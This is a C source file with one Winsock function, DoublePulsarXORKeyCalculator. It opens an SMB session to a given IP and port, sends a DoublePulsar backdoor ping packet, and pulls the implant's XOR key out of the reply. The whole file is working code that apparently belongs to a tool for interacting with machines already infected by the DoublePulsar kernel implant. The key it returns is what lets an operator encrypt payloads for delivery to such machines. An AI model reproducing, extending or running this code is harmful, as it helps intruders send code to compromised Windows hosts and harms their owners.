#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    SOCKET sock;
    const unsigned char *packets[4];
    size_t packet_sizes[4];
    unsigned char response_prefix[256];
    unsigned int xor_key = 0;
    size_t i;

    if (ip == NULL || port <= 0 || port > 65535)
        return 0;

    sock = smb_connect(ip, port);
    if (sock == INVALID_SOCKET)
        return 0;

    packets[0] = (const unsigned char *)SMB_NEGOTIATE_PKT;
    packet_sizes[0] = sizeof(SMB_NEGOTIATE_PKT);
    packets[1] = (const unsigned char *)SMB_SESSION_SETUP_PKT;
    packet_sizes[1] = sizeof(SMB_SESSION_SETUP_PKT);
    packets[2] = (const unsigned char *)SMB_TREE_CONNECT_PKT;
    packet_sizes[2] = sizeof(SMB_TREE_CONNECT_PKT);
    packets[3] = (const unsigned char *)DP_PING_PKT;
    packet_sizes[3] = sizeof(DP_PING_PKT);

    if ((size_t)SMB_RESP_SIGNATURE_START + 4u > sizeof(response_prefix) ||
        (size_t)SMB_RESP_SIGNATURE_END < (size_t)SMB_RESP_SIGNATURE_START + 3u)
        goto cleanup;

    for (i = 0; i < 4; ++i) {
        size_t sent = 0;
        unsigned char header[4];
        unsigned int body_length;
        size_t body_read = 0;
        int received;

        while (sent < packet_sizes[i]) {
            size_t remaining = packet_sizes[i] - sent;
            int amount = remaining > 0x7fffffffU ? 0x7fffffff : (int)remaining;
            int result;

            if (amount <= 0)
                goto cleanup;

            result = send(sock, (const char *)packets[i] + sent, amount, 0);
            if (result == SOCKET_ERROR || result == 0)
                goto cleanup;
            sent += (size_t)result;
        }

        {
            size_t header_read = 0;

            while (header_read < sizeof(header)) {
                received = recv(sock, (char *)header + header_read,
                                (int)(sizeof(header) - header_read), 0);
                if (received <= 0)
                    goto cleanup;
                header_read += (size_t)received;
            }
        }

        memcpy(response_prefix, header, sizeof(header));
        body_length = ((unsigned int)header[1] << 16) |
                      ((unsigned int)header[2] << 8) |
                      (unsigned int)header[3];

        while (body_read < body_length) {
            unsigned char chunk[1024];
            size_t remaining = (size_t)body_length - body_read;
            int amount = remaining > sizeof(chunk) ? (int)sizeof(chunk) : (int)remaining;
            size_t frame_offset = sizeof(header) + body_read;

            received = recv(sock, (char *)chunk, amount, 0);
            if (received <= 0)
                goto cleanup;

            if (frame_offset < sizeof(response_prefix)) {
                size_t copy_length = sizeof(response_prefix) - frame_offset;
                if (copy_length > (size_t)received)
                    copy_length = (size_t)received;
                memcpy(response_prefix + frame_offset, chunk, copy_length);
            }

            body_read += (size_t)received;
        }

        if (i == 3) {
            size_t response_size = sizeof(header) + (size_t)body_length;
            size_t signature_offset = (size_t)SMB_RESP_SIGNATURE_START;

            if (response_size < signature_offset + 4u)
                goto cleanup;

            xor_key = ((unsigned int)response_prefix[signature_offset] << 24) |
                      ((unsigned int)response_prefix[signature_offset + 1u] << 16) |
                      ((unsigned int)response_prefix[signature_offset + 2u] << 8) |
                      (unsigned int)response_prefix[signature_offset + 3u];
        }
    }

    closesocket(sock);
    return xor_key;

cleanup:
    closesocket(sock);
    return 0;
}